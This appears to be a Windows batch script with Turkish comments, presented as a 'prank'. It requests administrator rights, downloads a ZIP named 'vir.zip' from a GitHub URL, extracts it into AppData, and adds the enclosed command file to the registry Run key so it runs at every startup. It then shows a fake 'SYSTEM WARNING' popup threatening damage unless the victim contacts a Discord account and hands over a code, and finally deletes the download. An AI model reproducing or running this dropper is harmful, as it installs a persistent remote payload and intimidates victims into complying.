@echo off
:: 1. Yönetici Yetkisi Al
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo Yonetici yetkisi aliniyor...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: 2. ZIP Dosyasını İndir
set "ZIP_URL=https://github.com/QuentiumumPlus/Nww/raw/main/%%25temp%%25.zip"
set "DEST_ZIP=%temp%\vir.zip"
set "EXTRACT_PATH=%AppData%\HupiPrank"

echo Dosya indiriliyor...
powershell -Command "(New-Object Net.WebClient).DownloadFile('%ZIP_URL%', '%DEST_ZIP%')"

:: 3. ZIP'i Çıkart
echo Dosyalar cikariliyor...
powershell -Command "Expand-Archive -Path '%DEST_ZIP%' -DestinationPath '%EXTRACT_PATH%' -Force"

:: 4. Kalıcılık (Registry ve AppData)
copy "%EXTRACT_PATH%\senin_dosyan.cmd" "%AppData%\HupiSystem.cmd" >nul
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HupiPrank" /t REG_SZ /d "%AppData%\HupiSystem.cmd" /f

:: 5. Şaka Mesajı ve Temizlik
echo Set WshShell = CreateObject("WScript.Shell") > "%AppData%\msg.vbs"
echo WshShell.Popup "By:@FT|RAVHİN Adli discord hesabina ulas, ABrainrot kodunu vermezsen bilgisayarin hasar gorecektir!", 0, "SYSTEM WARNING", 48 >> "%AppData%\msg.vbs"
start "" "%AppData%\msg.vbs"

:: 6. İndirilenleri Sil
del "%DEST_ZIP%"
echo Kurulum tamamlandi.
pause